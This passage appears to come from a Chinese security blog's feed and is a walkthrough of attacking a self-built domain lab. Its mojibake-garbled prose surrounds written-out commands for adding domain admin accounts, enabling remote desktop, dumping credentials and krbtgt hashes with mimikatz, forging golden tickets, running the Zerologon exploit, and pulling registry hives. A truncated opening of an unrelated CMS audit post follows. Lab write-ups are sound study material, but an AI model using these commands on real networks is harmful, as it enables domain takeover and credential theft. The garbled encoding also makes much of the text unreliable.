alt="image-20210823145340538"></p><p>åˆ©ç”¨æ¼æ´è·å–å­åŸŸæ§æƒé™</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823145610266.png" alt="image-20210823145610266"></p><p>åˆ©ç”¨å‘½ä»¤è‡ªå·±åˆ›å»ºä¸€ä¸ªåŸŸæ§ç”¨æˆ·ï¼Œå¹¶ä¸”å°†ç”¨æˆ·åŠ å…¥åŸŸç®¡ç»„</p><p><code>net user lcdm lcdm123 /add /doamin</code>  æ·»åŠ åŸŸç”¨æˆ·</p><p><code>net group &quot;Domain Admins&quot; lcdm /add /domain</code>  å°†ç”¨æˆ·åŠ å…¥ç”¨æˆ·ç»„</p><p><code>net user lcdm123</code>  æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å­˜åœ¨</p><blockquote><p><del>æ·»åŠ å¤±è´¥ï¼ŒåŸå› ä¸æ¸…æ¥š</del>  åæœŸå‘ç°æ˜¯å› ä¸ºç”¨æˆ·çš„å¯†ç ä¸å¤Ÿå¤æ‚</p></blockquote><p>å¼€å¯è¿œç¨‹æ¡Œé¢ç«¯å£</p><p><code>reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</code> è®¾ç½®è¿œç¨‹ç«¯å£</p><p><code>wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</code> å¼€å¯è¿œç¨‹æ¡Œé¢</p><p><code>set command &quot;netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow&quot;</code> é˜²ç«å¢™æ”¾è¡Œ3389</p><blockquote><p>è¿™ä¸ªæ˜¯ä¹Ÿæ‰“å¼€å¤±è´¥äº†ï¼Ÿï¼Ÿï¼Ÿ ä¹Ÿæ²¡æœ‰å…·ä½“å›æ˜¾ï¼Œä¸æ¸…æ¥šåŸå› </p></blockquote><p>å…ˆæŠŠå­åŸŸæ§æ”¾åœ¨ä¸€è¾¹ï¼Œå›åˆ°CSé€‰å–å¦å¤–çš„æ–¹æ³•ï¼Œå…ˆæŠ“å–æœ¬åœ°ç”¨æˆ·å¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823160344639.png" alt="image-20210823160344639"></p><p>å¼€å¯è¿œç¨‹æ¡Œé¢</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823160426190.png" alt="image-20210823160426190"></p><p>ç™»å½•webæœåŠ¡å™¨</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823160831478.png" alt="image-20210823160831478"></p><blockquote><p>å½“å‰ç”¨æˆ·ä¸èƒ½è¿œç¨‹æ¡Œé¢</p></blockquote><p>è§£å†³åŠæ³•<code> net localgroup &quot;Remote Users&quot; XIAOYU\web /add</code> </p><blockquote><p>æ·»åŠ æ—¶éœ€è¦å¡«å†™å®Œæ•´çš„ç”¨æˆ·ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ‰€åœ¨çš„åŸŸ </p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823161221182.png" alt="image-20210823161221182"></p><p>è¿æ¥æˆåŠŸ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823161421368.png" alt="image-20210823161421368"></p><p>ç»§ç»­è·å–åŸŸæ§æƒé™ï¼Œæ£€æŸ¥ä¸»æœºæ˜¯å¦å­˜åœ¨MS14-068æ¼æ´</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823165525149.png" alt="image-20210823165525149"></p><blockquote><p>å¤±è´¥äº†â€¦â€¦â€¦â€¦ ç»§ç»­æƒ³å…¶ä»–åŠæ³•</p></blockquote><p>å°è¯•é‡æ–°å›åˆ°æ·»åŠ ç”¨æˆ·çš„åœ°æ–¹ï¼Œå¯¹äºç”¨æˆ·æ·»åŠ å¤±è´¥é‚£é‡Œï¼ŒçŒœæƒ³ä¼šä¸ä¼šæ˜¯å¯†ç çš„é—®é¢˜ï¼Œå› ä¸ºåˆšåˆšä¹Ÿæœ‰è¿™ä¸ªé—®é¢˜ï¼Œæœç„¶æŠŠå¯†ç å˜å¤æ‚ä¹‹åå°±å¯ä»¥æˆåŠŸæ·»åŠ ç”¨æˆ·</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823172216247.png" alt="image-20210823172216247"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823172227624.png" alt="image-20210823172227624"></p><blockquote><p>è¿™é‡ŒåŠ å…¥ç®¡ç†å‘˜ç»„å¥½åƒè¿˜æ˜¯æ²¡æœ‰æˆåŠŸ</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823172248834.png" alt="image-20210823172248834"></p><p>æ¥ä¸‹æ¥æ˜¯ç»§ç»­å°è¯•å¼€å¯è¿œç¨‹æ¡Œé¢</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">REG <span class="hljs-builtin-name">ADD</span> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br><br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br></code></pre></td></tr></table></figure><blockquote><p>æœ¬åœ°å¯ä»¥æ‰§è¡Œä½†æ˜¯è¿œç¨‹ä¸èƒ½æ‰§è¡Œï¼Ÿ åŸå› ä¸æ˜</p><p>å…ˆç›´æ¥åœ¨æœ¬åœ°å¼€å¯å§ï¼Œç„¶åæŠŠæ·»åŠ çš„ç”¨æˆ·åŠ å…¥åŸŸç®¡ç†å‘˜ç»„ï¼Œå¾€åæ¸—é€å§:sob:</p><p>å¸ˆå‚…çš„æ–°æ€è·¯ï¼šå°†å‘½ä»¤å†™å…¥batæ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œbatï¼Œè¿™ä¸ªå¹³æ—¶åœ¨linuxä¸Šåˆ©ç”¨è¾ƒå¤šåœ¨Windowså°±æ²¡æœ‰ååº”è¿‡æ¥:pig:</p></blockquote><p>åˆ©ç”¨éš§é“åœ¨æœ¬åœ°ä¸Šè¿æ¥è¿œç¨‹æ¡Œé¢åæŠ¥é”™</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823174550341.png" alt="image-20210823174550341"></p><p>ç›´æ¥å¥—å¨ƒï¼Œåˆ©ç”¨webæœåŠ¡å™¨çš„è¿œç¨‹æ¡Œé¢è¿æ¥åŸŸæ§çš„è¿œç¨‹æ¡Œé¢</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824101043489.png" alt="image-20210824101043489"></p><blockquote><p><del>åˆ°è¿™é‡Œå­˜åœ¨çš„é—®é¢˜</del></p><ol><li><del>è¿œç¨‹æ¡Œé¢æ˜¯æˆ‘ä¸»åŠ¨ç›´æ¥åœ¨å­åŸŸæ§ä¸Šå¼€å¯çš„</del></li><li><del>æ·»åŠ ç”¨æˆ·æˆåŠŸï¼Œä½†æ˜¯ç”¨æˆ·æ·»åŠ åˆ°åŸŸç®¡ç†å‘˜ç»„å¤±è´¥ï¼Œæˆ‘ç›´æ¥åœ¨æœ¬æœºä¸Šæ·»åŠ ï¼Œç„¶åç»§ç»­å¾€åæµ‹è¯•</del></li></ol><p>è¿˜éœ€è¦å¤šç§¯ç´¯ç‚¹windowsæ¼æ´</p></blockquote><p>MS17-010åˆ©ç”¨å¤±è´¥å¯ä»¥é€‰æ‹©ä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•æ”»å‡»</p><p><strong>CVE-2020-1472</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826140535452.png" alt="image-20210826140535452"></p><blockquote><p>å­˜åœ¨CVE-2020-1472æ¼æ´ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨ï¼Œå…·ä½“åˆ©ç”¨åœ¨æ”»å‡»ç‹¬ç«‹åŸŸæ§æ¿å—ï¼Œè·å–åˆ°shellåå¯ä»¥ç›´æ¥æ·»åŠ ç”¨æˆ·å¼€å¯è¿œç¨‹æ¡Œé¢ç­‰</p></blockquote><p>åˆ›å»ºåŸŸç®¡ç†å‘˜ç”¨æˆ·åï¼Œå°†WEBæœåŠ¡å™¨ä¸å­åŸŸæ§å»ºç«‹<code>ipc</code>è¿æ¥</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\10.10.3.6\ipc$  <span class="hljs-string">&quot;password&quot;</span> /user:username å»ºç«‹è¿æ¥<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> æŸ¥çœ‹è¿æ¥<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824102350664.png" alt="image-20210824102350664"></p><p><strong>å­åŸŸä¸Šçº¿CS</strong></p><p>å…ˆå»ºç«‹ä¸€ä¸ªç›‘å¬</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824110008260.png" alt="image-20210824110008260"></p><p><img src="D:\markdown\image-20210824110031253.png" alt="image-20210824110031253"></p><p>åˆ©ç”¨è¿™ä¸ªç›‘å¬å™¨ç”Ÿæˆä¸€ä¸ªpayloadï¼Œç„¶åä¸Šä¼ åˆ°webæœåŠ¡å™¨ï¼Œä¹‹ååˆ©ç”¨<code>ipc$</code>ä¸Šä¼ åˆ°å­åŸŸæ§æœåŠ¡å™¨ï¼Œåˆ©ç”¨è¿œç¨‹æ¡Œé¢æ‰§è¡Œpayloadï¼Œå­åŸŸå°±ä¸Šçº¿äº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824110423622.png" alt="image-20210824110423622"></p><h4 id="è·å–çˆ¶åŸŸæƒé™"><a href="#è·å–çˆ¶åŸŸæƒé™" class="headerlink" title="è·å–çˆ¶åŸŸæƒé™"></a>è·å–çˆ¶åŸŸæƒé™</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mimikatz.exe<br>lsadump::lsa /patch /<span class="hljs-symbol">user:</span>lcdm123<span class="hljs-variable">$ </span> <span class="hljs-comment">#lcdm123æ˜¯çˆ¶åŸŸå(lcdm123.com)å‰é¢çš„é‚£éƒ¨åˆ†</span><br>lsadump::trust /patch<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824133332369.png" alt="image-20210824133332369"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824133034799.png" alt="image-20210824133034799"></p><blockquote><p>XIAOYU       S-1-5-21-2845514817-4131120174-542881076</p><p>LCDM123    S-1-5-21-2230540616-3190751709-2169179123</p><p>NTLM     715e932ab28c6dfc6ebe0ef915f6e26a</p></blockquote><p>æ¥ç€ç»§ç»­è·å–krbtgtæ•£åˆ—å€¼</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-attr">lsadump:</span>:lsa <span class="hljs-regexp">/patch /</span><span class="hljs-attr">user:</span>krbtgt<br><span class="hljs-attr">sekurlsa:</span>:krbtgt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824133911902.png" alt="image-20210824133911902"></p><p>ä¼ªé€ é»„é‡‘ç¥¨æ®</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Kerberos</span>::golden /user:administrator /domain:å½“å‰åŸŸå /sid:å½“å‰SID /sids:ç›®æ ‡åŸŸSID-<span class="hljs-number">519</span> /krbtgt: krbtgtæ•£åˆ— /ptt<br><span class="hljs-attribute">Kerberos</span>::golden /user:administrator /domain:xiaoyu.lcdm<span class="hljs-number">123</span>.com /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2845514817</span>-<span class="hljs-number">4131120174</span>-<span class="hljs-number">542881076</span> /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2230540616</span>-<span class="hljs-number">3190751709</span>-<span class="hljs-number">2169179123</span>-<span class="hljs-number">519</span> /krbtgt:<span class="hljs-number">7</span>f<span class="hljs-number">5</span>c<span class="hljs-number">19853</span>ad<span class="hljs-number">2</span>ead<span class="hljs-number">5</span>a<span class="hljs-number">20</span>f<span class="hljs-number">32864</span>ebb<span class="hljs-number">3210</span> /ptt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824134706936.png" alt="image-20210824134706936"></p><p>å°´å°¬å¥½åƒè¿˜æ˜¯æ‹’ç»è®¿é—®</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824135858818.png" alt="image-20210824135858818"></p><blockquote><p>è¯´æ˜ä»¥ä¸Šæ­¥éª¤æ˜¯æœ‰é—®é¢˜çš„</p></blockquote><blockquote><p>æœ‰ä¸ªå°ç–‘é—®ï¼Ÿï¼Ÿ æ€ä¹ˆæŸ¥çˆ¶åŸŸçš„è®¡ç®—æœºå</p></blockquote><p><del>è¿™é‡Œå…ˆæš‚åœï¼Œç»§ç»­å¾€åé¢åš</del></p><p><strong>CVE-2020-1742</strong></p><p>åˆ©ç”¨<code>mimikatz</code>æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨</p><p><code>shell mimikatz &quot;lsadump::zerologon /target:10.10.21.2 /account:mainyu$&quot; &quot;exit&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826140919742.png" alt="image-20210826140919742"></p><p>ç½®é›¶æ”»å‡»<code>shell mimikatz &quot;lsadump::zerologon /target:10.10.21.2 /account:CAIWUYU$ /exploit&quot; &quot;exit&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826141153288.png" alt="image-20210826141153288"></p><p>æŠ“å–ç½®é›¶åçš„hash</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826142300737.png" alt="image-20210826142300737"></p><p>è¿æ¥ä¸Šshell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826142557317.png" alt="image-20210826142557317"></p><blockquote><p>æ­¤æ—¶å¯ä»¥ä»»æ„æ·»åŠ ç”¨æˆ·ï¼Œå¼€å¯è¿œç¨‹åŠŸèƒ½äº†</p></blockquote><p>ä¸‹è½½samæ–‡ä»¶ï¼ˆæ¢å¤åŸhashï¼‰å¹¶ä¸”æ·»åŠ åŸŸç®¡ç†å‘˜ç”¨æˆ·</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826143121418.png" alt="image-20210826143121418"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826143208733.png" alt="image-20210826143208733"></p><p>æ¢å¤hash</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826143647194.png" alt="image-20210826143647194"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826143702610.png" alt="image-20210826143702610"></p><blockquote><p>æ¢å¤æˆåŠŸ</p></blockquote><p>å»ºç«‹IPC$</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826144643007.png" alt="image-20210826144643007"></p><blockquote><p>è¿™ä¸ªåˆæ˜¯ä»€ä¹ˆé—®é¢˜ï¼Ÿï¼Ÿï¼Ÿ æœªè§£å†³ï¼ï¼ï¼</p></blockquote><h4 id="æ”»å‡»ç‹¬ç«‹åŸŸæ§"><a href="#æ”»å‡»ç‹¬ç«‹åŸŸæ§" class="headerlink" title="æ”»å‡»ç‹¬ç«‹åŸŸæ§"></a>æ”»å‡»ç‹¬ç«‹åŸŸæ§</h4><p>å‘ç°ä¸»æœºå­˜åœ¨å…¶ä»–ç½‘æ®µï¼Œæ‰€ä»¥ç»§ç»­æ‰«æå†…ç½‘ï¼Œå‘ç°æ–°ä¸»æœº</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824143350418.png" alt="image-20210824143350418"></p><p>æ­å»ºäºŒçº§ä»£ç†è¿›è¡Œæ”»å‡»</p><blockquote><p>ewäºŒçº§ä»£ç†å¤±è´¥â€¦â€¦  å°è¯•å…¶ä»–åŠæ³•</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824151347382.png" alt="image-20210824151347382"></p><p>ä½¿ç”¨FRPæ­å»ºäºŒçº§ä»£ç†</p><blockquote><p>éœ€è¦æ ¼å¤–æ³¨æ„å„å†…å®¹å¡«å†™ï¼Œæ ¹æ®ä¹‹å‰è‡ªå·±æ€»ç»“çš„æ­å»ºï¼Œä¸ä¼šå‡ºä»€ä¹ˆå¤§é—®é¢˜</p></blockquote><p><strong>å¼€å§‹æ”»å‡»ç‹¬ç«‹åŸŸ</strong></p><p><del>MS17-010</del> å¤±è´¥</p><p>é¦–å…ˆä¸ºMSFè®¾ç½®ä»£ç†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824163753996.png" alt="image-20210824163753996"></p><p>æµ‹è¯•æ˜¯å¦å­˜åœ¨MS17-010</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824163910769.png" alt="image-20210824163910769"></p><p>æµ‹è¯•æ‰§è¡Œå‘½ä»¤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824163948984.png" alt="image-20210824163948984"></p><blockquote><p>è¿˜å­˜åœ¨ä¸€ä¸ªå†…ç½‘IPâ€¦â€¦</p></blockquote><p>ä½¿ç”¨MSFå°è¯•è·å–shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824170723112.png" alt="image-20210824170723112"></p><blockquote><p>å¤±è´¥äº†ï¼Œå°è¯•æ·»åŠ ç”¨æˆ·ä¹Ÿé‡åˆ°äº†ä¹‹å‰çš„æƒ…å†µï¼Œè¿œç¨‹æ¡Œé¢ä¹Ÿä¸èƒ½æ‰“å¼€ï¼Œåº”è¯¥æ˜¯å‘½ä»¤å­˜åœ¨é—®é¢˜å§</p></blockquote><p><strong>CVE-2020-1472</strong></p><p><code>shell mimikatz &quot;lsadump::zerologon /target:10.10.21.2 /account:CAIWUYU$&quot; &quot;exit&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826095722660.png" alt="image-20210826095722660"></p><blockquote><p>æµ‹è¯•å¾—å‡ºæ¼æ´æ˜¯å­˜åœ¨çš„</p></blockquote><p>ä½¿ç”¨mimikatzåˆ©ç”¨CVE-2020-1472å°†åŸŸæ§å¯†ç è®¾ç½®ä¸ºç©º</p><p><code>shell mimikatz &quot;lsadump::zerologon /target:10.10.21.2 /account:CAIWUYU$ /exploit&quot; &quot;exit&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826100141094.png" alt="image-20210826100141094"></p><blockquote><p>æˆåŠŸç½®ç©º</p></blockquote><p>ä½¿ç”¨impacketå·¥å…·åŒ…æ”»å‡»</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">proxychains git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/SecureAuthCorp/impacket.git<br><span class="hljs-keyword">cd</span> impacket/<br>sudo pip3 install .<br>sudo <span class="hljs-keyword">python3</span> setup.<span class="hljs-keyword">py</span> install<br><br>pip3å®‰è£…ï¼š<br>wget http<span class="hljs-variable">s:</span>//bootstrap.pypa.io/<span class="hljs-built_in">get</span>-pip.<span class="hljs-keyword">py</span><br><span class="hljs-keyword">python3</span> <span class="hljs-built_in">get</span>-pip.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826102318636.png" alt="image-20210826102318636"></p><p>ä¸‹è½½samæ–‡ä»¶ä¸ºä¸‹ä¸€æ­¥æ¢å¤æœºå™¨å¯†ç åšå‡†å¤‡</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826102936705.png" alt="image-20210826102936705"></p><p>é—®é¢˜æ¥äº†ï¼Œå±…ç„¶ä¸èƒ½ä¸‹è½½<code>.save</code>æ–‡ä»¶</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs maxima">reg <span class="hljs-built_in">save</span> HKLM\SYSTEM <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span><br>reg <span class="hljs-built_in">save</span> HKLM\SAM sam.<span class="hljs-built_in">save</span><br>reg <span class="hljs-built_in">save</span> HKLM\SECURITY security.<span class="hljs-built_in">save</span><br><br><span class="hljs-built_in">get</span> <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span><br><span class="hljs-built_in">get</span> sam.<span class="hljs-built_in">save</span><br><span class="hljs-built_in">get</span> security.<span class="hljs-built_in">save</span><br><br><span class="hljs-built_in">del</span> /f <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span><br><span class="hljs-built_in">del</span> /f sam.<span class="hljs-built_in">save</span><br><span class="hljs-built_in">del</span> /f security.<span class="hljs-built_in">save</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826105746880.png" alt="image-20210826105746880"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826104057033.png" alt="image-20210826104057033"></p><blockquote><p>çŒœæµ‹æœ‰å¯èƒ½æ˜¯å¤šçº§ä»£ç†çš„é—®é¢˜å§ï¼Œç½‘ç»œä¸ç¨³å¯¼è‡´ä¸‹è½½å¤±è´¥</p><p>é”™è¯¯åŸå› ï¼šimpacketæœ€æ–°åŒ…è‡ªèº«é—®é¢˜ï¼Œä½¿ç”¨ä¹‹å‰çš„ç‰ˆæœ¬å³å¯</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826105721993.png" alt="image-20210826105721993"></p><p>åˆ©ç”¨ shell æ·»åŠ ä¸€ä¸ªåŸŸç®¡ç†å‘˜ç”¨æˆ·</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">net<span class="hljs-built_in"> user </span>lcdm1 hongrisec@2021 /<span class="hljs-builtin-name">add</span> /domain<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain admins&quot;</span> lcdm1 /<span class="hljs-builtin-name">add</span> /domain<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826111805204.png" alt="image-20210826111805204"></p><p>åˆ©ç”¨ä¸‹è½½åˆ°çš„æ–‡ä»¶è·å–åˆ°åŸ hash</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826110244043.png" alt="image-20210826110244043"></p><p>æ¢å¤åŸå¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826111140817.png" alt="image-20210826111140817"></p><p>å»ºç«‹ IPCï¼Œä¼ å…¥ä¸Šçº¿ CS</p><p><code>net use \\10.10.21.2\ipc$ &quot;hongrisec@2021&quot; /user:lcdm1</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826112116377.png" alt="image-20210826112116377"></p><p>ä½¿ç”¨ PsExec è·å–åˆ°è´¢åŠ¡åŸŸçš„ Shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826134343505.png" alt="image-20210826134343505"></p><p>è™½ç„¶è¿ä¸Šäº†ä½†æ˜¯ CS ä¸€ç›´ä¸èƒ½ä¸Šçº¿</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826134903610.png" alt="image-20210826134903610"></p><blockquote><p><del>éš¾é“æ˜¯å¤šçº§ä»£ç†çš„é—®é¢˜å¯¼è‡´å¼¹ä¸å‡ºæ¥ï¼Ÿï¼Ÿï¼Ÿ ä½†æ˜¯è¿™ä¸ªæ˜¯ä½¿ç”¨çš„ç›‘å¬å™¨åº”è¯¥å’Œä»£ç†æ²¡æœ‰å…³ç³»ï¼Œåº”è¯¥æ˜¯åˆ›å»ºpayloadçš„æ‰‹æ³•æœ‰é—®é¢˜</del></p></blockquote><p>ä¸Šé¢å¯ä»¥ç›´æ¥åœ¨CSä¸­ç”Ÿæˆ spawn ç„¶ååˆ©ç”¨æ·»åŠ çš„ç”¨æˆ·å’Œå¯†ç å³å¯ä¸Šçº¿ CS</p><p>æ‹¿åˆ°äº†ç‹¬ç«‹åŸŸæ§çš„æƒé™åè¿™ä¸ªåŸŸå°±åŸºæœ¬å…¨éƒ¨æ²¦é™·äº†ï¼Œè¿™ä¸ªåŸŸå†…è¿˜æœ‰ä¸€ä¸ªä¸»æœºï¼Œå°±å¯ä»¥ç›´æ¥æ§åˆ¶äº†ï¼Œå¤§è‡´å°±æ”»å‡»åˆ°è¿™é‡Œäº†</p><h2 id="é—®é¢˜æ€»ç»“"><a href="#é—®é¢˜æ€»ç»“" class="headerlink" title="é—®é¢˜æ€»ç»“"></a>é—®é¢˜æ€»ç»“</h2><blockquote><p>é¶åœºæ˜¯è‡ªå·±æ­å»ºçš„ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨ä¸­å­˜åœ¨ä¸€äº›é—®é¢˜</p></blockquote><ul><li>æ¼æ´å¤ªå•ä¸€äº†ä½¿ç”¨ CVE-2020-1472 å°±æ‰“éäº†</li><li>å¯¹äºå¯¹äºå“ˆå¸Œä¼ é€’ï¼ˆPTHï¼‰æ”»å‡»æ²¡æœ‰æˆåŠŸï¼Œåº”è¯¥æ˜¯æ“ä½œé—®é¢˜ï¼Œéœ€è¦å•ç‹¬å¤ç°ä¸€ä¸‹</li><li>å¯¹äºåŸŸæ£®æ—çš„ç†è§£è¿˜ä¸æ˜¯å¤ªæ·±åˆ»ï¼ˆæ„Ÿè§‰å°±æ˜¯å¤šçº§ä»£ç†æ”»å‡»ï¼‰</li><li>é¶åœºå’Œå®é™…ç›¸å·®å¾ˆå¤šï¼Œç°åœ¨ä½¿ç”¨çš„æ¯”è¾ƒç²—æš´çš„æ”»å‡»æ–¹æ³•æ²¡æœ‰åšåˆ°ä¸ç•™ç—•è¿¹</li><li>åæœŸçš„åé—¨ï¼Œç—•è¿¹æ¸…ç†è¿˜æ²¡æœ‰ä½¿ç”¨</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Freebuf-åŸŸæ¸—é€é¶åœº&quot;&gt;&lt;a href=&quot;#Freebuf-åŸŸæ¸—é€é¶åœº&quot; class=&quot;headerlink&quot; title=&quot;Freebuf åŸŸæ¸—é€é¶åœº&quot;&gt;&lt;/a&gt;Freebuf åŸŸæ¸—é€é¶åœº&lt;/h1&gt;&lt;h2 id=&quot;æ­å»º&quot;&gt;&lt;a href=&quot;#æ­å»º&quot; cla</summary>
      
    
    
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>BlueCMS</title>
    <link href="http://example.com/2021/09/01/BlueCMS/"/>
    <id>http://example.com/2021/09/01/BlueCMS/</id>
    <published>2021-09-01T02:10:10.000Z</published>
    <updated>2021-09-22T01:41:42.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BlueCMS"><a href="#BlueCMS" class="headerlink" title="BlueCMS"></a>BlueCMS</h1><blockquote><p>BlueCMS__v1.6_sp1</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ä¸ªCMSæ˜¯ä¸€ä¸ªå¾ˆè€çš„ç‰ˆæœ¬ï¼Œè¿™é‡Œåˆ©ç”¨å®ƒæ¥å­¦ä¹ ç†Ÿæ‚‰ä¸€ä¸‹ä»£ç å®¡è®¡ã€‚å®¡è®¡çš„è¿‡ç¨‹ä¸­æš‚æ—¶æ²¡æœ‰åˆ©ç”¨Seayå·¥å…·å»åˆ†æä»£ç ï¼Œè€Œæ˜¯å°è¯•ç›´æ¥åˆ†æåŸæ¡†æ¶ï¼Œæ¯•ç«Ÿè¿™ä¸ªCMSçš„æºç æ¯”è¾ƒç®€å•ã€‚</p><h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><h3 id="åˆæ­¥äº†è§£"><a href="#åˆæ­¥äº†è§£" class="headerlink" title="åˆæ­¥äº†è§£"></a>åˆæ­¥äº†è§£</h3><p>é¦–å…ˆä»æ 